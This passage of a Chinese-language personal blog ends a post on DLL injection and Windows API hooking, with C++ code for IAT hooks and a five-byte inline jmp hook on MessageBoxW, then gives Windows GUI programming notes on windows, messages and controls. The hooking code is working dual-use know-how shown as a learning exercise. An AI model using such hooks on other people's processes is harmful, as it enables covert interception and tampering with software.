class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InstallHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//更改IAT处可写权限</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>(g_iatAddr, <span class="number">4</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    <span class="comment">//更改函数地址</span></span><br><span class="line">    *g_iatAddr = (DWORD)Hack;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>(g_iatAddr, <span class="number">4</span>, oldProtect, &amp;oldProtect);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">UnInstallHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//更改IAT处可写权限</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>(g_iatAddr, <span class="number">4</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    <span class="comment">//还原更改的IAT</span></span><br><span class="line">    *g_iatAddr = (DWORD)g_preIatAddr;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>(g_iatAddr, <span class="number">4</span>, oldProtect, &amp;oldProtect);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Inline-hook"><a href="#Inline-hook" class="headerlink" title="Inline hook"></a>Inline hook</h3><p>IAT hook 是有缺陷的，即若导入函数无名就会失去作用；</p>
<p>而知道的是，IAT hook 的主要思路就是<strong>改变所hook函数的地址</strong>；</p>
<p>既然要hook一个函数，那么这个函数一定会调用，则inline hook 的主旨便是：</p>
<p>在<strong>进入目标函数时执行跳转</strong>，跳转到自实现函数里去；意思就是更改其第一条汇编码为 <code>jmp aimAddr</code> ;</p>
<p>具体实现则是更改其第一条指令对应的硬编码，也就是机械码，二进制内容；</p>
<p>对于<strong>32位程序的x86</strong>而言，jmp指令会占 5 个字节，第一个固定 E9 为 jmp指令，后面跟随的4个字节为偏移；</p>
<p>该偏移的计算公式为 ： offset = aimAddr - jmp指令的下一条地址;</p>
<p>也就是           ： <strong>offset = aimAddr - jmp指令地址 - 5</strong>;</p>
<p>那么主要的dll构造思路为：</p>
<ol>
<li>拿到目标函数地址，存档其前5字节内容，因为要恢复；</li>
<li>算出偏移并更改目标地址前5字节内容为跳转；</li>
<li>执行自实现函数的处理部分；</li>
<li>恢复5字节内容；</li>
</ol>
<p>由此全局存储变量：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分别是目标函数地址，保留5字节和修改5字节</span></span><br><span class="line">DWORD aimAddr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> oldBytes[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> newBytes[<span class="number">5</span>] = &#123; <span class="number">0xE9</span> &#125;;</span><br></pre></td></tr></table></figure>



<p>则有初始化函数实现思路中 1，2 中的算偏移：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">InitHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hModule = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hModule == <span class="number">0</span>) <span class="keyword">return</span> FALSE;</span><br><span class="line">    <span class="comment">//获取真实的地址</span></span><br><span class="line">    aimAddr = (DWORD)<span class="built_in">GetProcAddress</span>(hModule, <span class="string">&quot;MessageBoxW&quot;</span>);</span><br><span class="line">    <span class="comment">//保留5字节</span></span><br><span class="line">    <span class="built_in">memcpy</span>(oldBytes, (<span class="keyword">char</span>*)aimAddr, <span class="number">5</span>);</span><br><span class="line">    <span class="comment">//偏移搞定，hack为自定义函数</span></span><br><span class="line">    DWORD offset = (DWORD)Hack - aimAddr - <span class="number">5</span>;</span><br><span class="line">    <span class="comment">//修改5字节</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;newBytes[<span class="number">1</span>], &amp;offset, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>装载和卸载钩子以实现 2，4：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">InstallHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((DWORD*)aimAddr, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    <span class="comment">//修改为跳转</span></span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">char</span>*)aimAddr, newBytes, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((DWORD*)aimAddr, <span class="number">5</span>, oldProtect, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">UnInstallHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((DWORD*)aimAddr, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    <span class="comment">//恢复</span></span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">char</span>*)aimAddr, oldBytes, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((DWORD*)aimAddr, <span class="number">5</span>, oldProtect, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后由自定义函数实现思路 3：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">Hack</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HWND    hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCWSTR lpText,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCWSTR lpCaption,</span></span></span><br><span class="line"><span class="params"><span class="function">    UINT    uType</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//调用原本函数的输出想要的效果</span></span><br><span class="line">    <span class="built_in">UnInstallHook</span>();</span><br><span class="line">    <span class="keyword">int</span> result = <span class="built_in">MessageBoxW</span>(<span class="number">0</span>, <span class="string">L&quot;hacker~&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line">    <span class="built_in">InstallHook</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同理，进程创建时初始化和挂钩，进程结束时解钩；</p>
<p>总体来说写法会比 IAT hook 更轻松；</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>刚入门dll注入系列以及hook，开始发现很有意思；</p>
<p>注意啊，hook的函数需要和原函数保持一致，包括调用约定和参数！！！</p>
</div></div><a class="button-hover more" href="/SecondBC/2022/12/12/DLL%E6%B3%A8%E5%85%A5%E4%B8%8EHOOK/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/SecondBC/2022/12/04/Windows%E7%BC%96%E7%A8%8B/">Windows编程</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2022-12-04</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Diary/">Diary</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Win/">Win</a></div></div><div class="post-content"><div class="main-content content"><p>重要头文件：windows.h；</p>
<p>word 是字，占2个字节；</p>
<p>不会的函数可以去微软查出来，vs里选中F1；</p>
<p>链接器 子系统 选择 窗口；</p>
<p>windows是操作<strong>消息</strong>的，它有一个消息队列，可获取如鼠标键盘产生的消息；</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><ul>
<li><p>UINT    unsigned int</p>
</li>
<li><p>DWORD   double word</p>
</li>
<li><p>PDWORD  pointer double word</p>
</li>
<li><p>BOOL     bool</p>
</li>
<li><p>short    short int</p>
</li>
<li><p>LRSULT   32 函数返回值</p>
</li>
<li><p>WPARAM LPARAM  32 消息参数</p>
</li>
<li><p>HANDLE    理解成windows对象，句柄</p>
</li>
<li><p>HWND      窗口句柄</p>
</li>
<li><p>HINSTANCE 实例句柄</p>
</li>
</ul>
<h2 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HINSTANCE hInstance,		<span class="comment">//程序的实例句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    HINSTANCE hPreInstance,		<span class="comment">//上一个程序实例句柄（遗弃）</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPSTR lpCmdLine,			<span class="comment">//命令行参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">int</span> nCmdShow				<span class="comment">//显示方式（最大化，窗口）</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure>

<p>参数一个不能少；</p>
<h2 id="弹窗"><a href="#弹窗" class="headerlink" title="弹窗"></a>弹窗</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MessageBox</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	HWND hWnd;				<span class="comment">//所有者窗口句柄（父级窗口） 无可填NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpText;			<span class="comment">//显示内容</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpCaption,		<span class="comment">//标题</span></span></span></span><br><span class="line"><span class="params"><span class="function">    UINT uType				<span class="comment">//风格（确认，取消一类的按键）</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>选择不同的按键返回不同的值；</p>
<h2 id="字符串处理"><a href="#字符串处理" class="headerlink" title="字符串处理"></a>字符串处理</h2><ul>
<li>ascii码对应普通字符串 CHAR -&gt; char</li>
<li>utf系列对应宽字符串  WCHAR -&gt; wchar_t 输出是 %ls  用 L 修饰</li>
<li>通用字符串          TCHAR -&gt; 类型随环境变化，引用 tchar.h 头  用_T（）修饰；</li>
</ul>
<p>由此引申出了三个版本的操作函数；</p>
<p><strong>长度操作</strong>：</p>
<p>strlen wcslen _tcslen</p>
<p><strong>字符串转数字</strong>：</p>
<p>atoi strtol</p>
<p>_wtoi wcstol</p>
<p>_ttoi tcstol</p>
<p><strong>数字转字符串</strong>：</p>
<p>itoa _itow _itot</p>
<p>因为字符串，所以分三个版本：A W T；</p>
<p>如 MessageBoxA ，以及 MessageBoxW ，前者处理多字节，后者处理宽字节；</p>
<p>字节转换：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//宽字节转多字节  (用的时候直接用宏定义)</span></span><br><span class="line"><span class="built_in">WideCharToMultiByte</span>()</span><br><span class="line">---</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WCHAR_TO_CHAR(lpW_Char, lpChar) \</span></span><br><span class="line"><span class="meta">WideCharToMultiByte(CP_ACP, NULL, lpW_Char, -1, \</span></span><br><span class="line"><span class="meta">lpChar, sizeof(lpChar), NULL, FALSE)</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//多字节转宽字节</span></span><br><span class="line"><span class="built_in">MultiByteToWideChar</span>()</span><br><span class="line">---</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHAR_TO_WCHAR(lpChar, lpWchar) \</span></span><br><span class="line"><span class="meta">MultiByteToWideChar(CP_ACP, NULL, lpChar, -1, \</span></span><br><span class="line"><span class="meta">lpWchar, sizeof(lpWchar))</span></span><br></pre></td></tr></table></figure>



<h2 id="创建窗口"><a href="#创建窗口" class="headerlink" title="创建窗口"></a>创建窗口</h2><p>先创建WinMain函数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">//都用W版本</span></span><br><span class="line">	<span class="comment">//创建窗口类</span></span><br><span class="line">	WNDCLASSW wnd = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	wnd.lpszClassName = <span class="string">L&quot;Second_BC&quot;</span>;	<span class="comment">//类名唯一</span></span><br><span class="line">	wnd.lpfnWndProc = WindowProc;		<span class="comment">//窗口回调函数</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//注册窗口类</span></span><br><span class="line">	<span class="built_in">RegisterClassW</span>(&amp;wnd);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建窗口</span></span><br><span class="line">	HWND window = <span class="built_in">CreateWindowW</span>(</span><br><span class="line">					wnd.lpszClassName,	<span class="comment">//类名</span></span><br><span class="line">					<span class="string">L&quot;1049&quot;</span>,			<span class="comment">//窗口名</span></span><br><span class="line">					WS_OVERLAPPEDWINDOW,<span class="comment">//风格</span></span><br><span class="line">					CW_USEDEFAULT,		<span class="comment">//x,y坐标，默认款式</span></span><br><span class="line">					<span class="number">0</span>,</span><br><span class="line">					CW_USEDEFAULT,		<span class="comment">//长宽，默认款式</span></span><br><span class="line">					<span class="number">0</span>,</span><br><span class="line">					<span class="literal">NULL</span>,				<span class="comment">//父窗口的句柄</span></span><br><span class="line">					<span class="literal">NULL</span>,				<span class="comment">//菜单</span></span><br><span class="line">					hInstance,			<span class="comment">//实例句柄</span></span><br><span class="line">					<span class="number">0</span>					<span class="comment">//传给回调函数参数</span></span><br><span class="line">				);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//显示窗口</span></span><br><span class="line">	<span class="built_in">ShowWindow</span>(</span><br><span class="line">		window,			<span class="comment">//窗口句柄</span></span><br><span class="line">		SW_NORMAL		<span class="comment">//默认显示方式</span></span><br><span class="line">	);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//获取消息</span></span><br><span class="line">	MSG msg = &#123; <span class="number">0</span> &#125;;	<span class="comment">//消息类</span></span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">GetMessageW</span>(	<span class="comment">//不断获取消息		</span></span><br><span class="line">		&amp;msg,			<span class="comment">//消息类</span></span><br><span class="line">		<span class="number">0</span>,				<span class="comment">//窗口句柄 0默认全部窗口</span></span><br><span class="line">		<span class="number">0</span>,				<span class="comment">//消息类型默认</span></span><br><span class="line">		<span class="number">0</span></span><br><span class="line">	))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">DispatchMessageW</span>(&amp;msg);	<span class="comment">//分发消息给处理函数</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>处理函数\回调：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ HWND hwnd,			<span class="comment">//窗口句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ UINT uMsg,			<span class="comment">//消息</span></span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ WPARAM wParam,		<span class="comment">//参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ LPARAM lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in"><span class="keyword">switch</span></span> (uMsg)			<span class="comment">//操作消息</span></span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">		<span class="built_in">DestroyWindow</span>(hwnd);<span class="comment">//销毁窗口</span></span><br><span class="line">		<span class="built_in">PostQuitMessage</span>(<span class="number">0</span>); <span class="comment">//退出消息，终止循环</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hwnd, uMsg, wParam, lParam);		<span class="comment">//默认窗口处理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单说说回调函数机制：</p>
<p>每个窗口类会带有一个回调函数，用于处理这个类创建的窗口所获取的信息；</p>
<p>在无限循环的信息捕获中，当收到信息后（晃动鼠标，点击，按键），则使得 <code>DispatchMessageW(&amp;msg);</code> 激活，调用指定窗口回调函数；</p>
<p>在这里指定窗口是 0 ，则是所有窗口；</p>
<p>回调函数中，为了当 <strong>点击叉掉</strong> 窗口时就 <strong>结束程序</strong> 就应该设置 退出信息 ： <code>WM_CLOSE</code> 摧毁窗口，并退出 postmessage，此时就会退出在主函数里的循环；</p>
<p>回调函数的参数，第二个是信息，第三第四个是一些参数，这些参数有一定的作用，可以知道实际的状态：键盘按下但无弹起 / 鼠标处于窗口位置，等等；</p>
<h2 id="消息处理"><a href="#消息处理" class="headerlink" title="消息处理"></a>消息处理</h2><p>定义在 WINUSER.H 中， 以 WM_开头 （windows message）；</p>
<h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ol>
<li><p>窗口消息，如之前遇到的 <code>WM_CLOSE</code> ；</p>
</li>
<li><p>命令消息，特指 <code>WM_COMMAND</code> ，点击菜单，控件等会产生；</p>
<table>
<thead>
<tr>
<th>WM_COMMAND</th>
<th>LOW WPARAM</th>
<th>HIGH WPARAM</th>
<th>LPARAM</th>
</tr>
</thead>
<tbody><tr>
<td>标准控件</td>
<td>id</td>
<td>响应码</td>
<td>控件句柄</td>
</tr>
<tr>
<td>快捷键</td>
<td>id</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td>菜单</td>
<td>id</td>
<td>0</td>
<td>0</td>
</tr>
</tbody></table>
</li>
<li><p>通知消息，特指 <code>WM_NOTIFY</code> ，只使用 用 windows 的公共控件，如列表，视图；</p>
<table>
<thead>
<tr>
<th>WM_NOTIFY</th>
<th>WPARAM</th>
<th>LPARAM</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td>id</td>
<td>NMHDR指针</td>
</tr>
</tbody></table>
<p>NMHDR -&gt; notify message header</p>
</li>
</ol>
<p>控件消息，如：</p>
<p>BM_    按钮</p>
<p>EM_    编辑框</p>
<p>STM_    静态文本</p>
<p>CM_    组合框</p>
<p>LBM_    列表</p>
<p>以及用户自定义消息，消息号大于 <code>WM_USER</code> ;</p>
<h3 id="发送"><a href="#发送" class="headerlink" title="发送"></a>发送</h3><p>PostMessage， SendMessage；</p>
<p>前者放到消息队列，后者主动调用 指定的回调函数；</p>
<h3 id="变参函数"><a href="#变参函数" class="headerlink" title="变参函数"></a>变参函数</h3><p>用于如printf输出宽字节；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(LPCWSTR format, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WCHAR wchar_buff[<span class="number">100</span>]&#123; <span class="number">0</span> &#125;;</span><br><span class="line">    va_list arglist;	<span class="comment">//本质char类型，用于存放后面的参数</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">va_start</span>(arglist, format);	<span class="comment">//第二个参数是指针起始+1，也就是后面的参数</span></span><br><span class="line">    <span class="built_in">wvsprintfW</span>(wchar_buff, format, arglist);</span><br><span class="line">    <span class="built_in">va_end</span>(arglist);	<span class="comment">//结束</span></span><br><span class="line">    <span class="built_in">wprintf</span>(format, wchar_buff);	<span class="comment">//输出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="窗口控件"><a href="#窗口控件" class="headerlink" title="窗口控件"></a>窗口控件</h2><p>使用控件引头文件： <code>&lt;CommCtrl.h&gt;</code></p>
<p>窗口风格分两类：</p>
<p>窗口关系:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WS_OVERLAPED	重叠</span><br><span class="line">WS_POPUP		弹窗</span><br><span class="line">WS_CHILD		子窗口</span><br></pre></td></tr></table></figure>

<p>窗口外观：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WS_BORDER</span><br><span class="line">WS_CAPITON</span><br></pre></td></tr></table></figure>

<p>它们之间可以用 | 运算结合使用；</p>
<p>控件的本质，还是窗口，在父窗口创建开始添加即可；</p>
<p>标准控件：</p>
<table>
<thead>
<tr>
<th align="left">类名</th>
<th>名称</th>
</tr>
</thead>
<tbody><tr>
<td align="left">WC_BUTTON</td>
<td>按钮</td>
</tr>
<tr>
<td align="left">WC_STATIC</td>
<td>静态文本</td>
</tr>
<tr>
<td align="left">WC_COMBOBOX</td>
<td>复合框</td>
</tr>
<tr>
<td align="left">WC_EDIT</td>
<td>编辑框</td>
</tr>
<tr>
<td align="left">WC_LISTBOX</td>
<td>列表框</td>
</tr>
<tr>
<td align="left">WC_SCROLLBAR</td>
<td>滚动条</td>
</tr>
</tbody></table>
<p>通用控件，如：</p>
<p>WC_LISTVIEW    列表框控件</p>
<p>WC_TREEVIEW    树控件</p>
<p>WC_TABCONTROL  Tab控件</p>
<p>…</p>
<p>子控件响应父窗口，使用 命令消息 和 通知消息，标准控件使用前者，通用控件使用后者；</p>
<p>修改之后的回调函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ HWND hwnd,			<span class="comment">//窗口句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ UINT uMsg,			<span class="comment">//消息</span></span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ WPARAM wParam,		<span class="comment">//参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">	_In_ LPARAM lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">static</span> HINSTANCE hInstance = <span class="built_in">GetModuleHandleW</span>(<span class="literal">NULL</span>);	<span class="comment">//NULL默认获取当前程序实例句柄</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in"><span class="keyword">switch</span></span> (uMsg)			<span class="comment">//操作消息</span></span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> WM_CREATE:</span><br><span class="line">		<span class="comment">//创建窗口时创建子控件，menu栏是控件ID，存于wParam低位，lParam存控件句柄</span></span><br><span class="line">		<span class="built_in">CreateWindowW</span>(WC_BUTTON, <span class="string">L&quot;Button&quot;</span>, WS_CHILD | WS_VISIBLE, <span class="number">10</span>, <span class="number">10</span>, <span class="number">80</span>, <span class="number">30</span>, hwnd, (HMENU)<span class="number">0x100</span>, hInstance, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">		<span class="built_in">DestroyWindow</span>(hwnd);<span class="comment">//销毁窗口</span></span><br><span class="line">		<span class="built_in">PostQuitMessage</span>(<span class="number">1</span>); <span class="comment">//退出消息</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//激活控件，获取控件ID，执行相应操作</span></span><br><span class="line">		WORD controlId = <span class="built_in">LOWORD</span>(wParam);</span><br><span class="line">		<span class="built_in"><span class="keyword">switch</span></span> (controlId)</span><br><span class="line">		&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x100</span>:</span><br><span class="line">			<span class="built_in">MessageBoxW</span>(hwnd, <span class="string">L&quot;Click&quot;</span>, <span class="string">L&quot;Button&quot;</span>, MB_OK);</span><br><span class="line">           	<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span 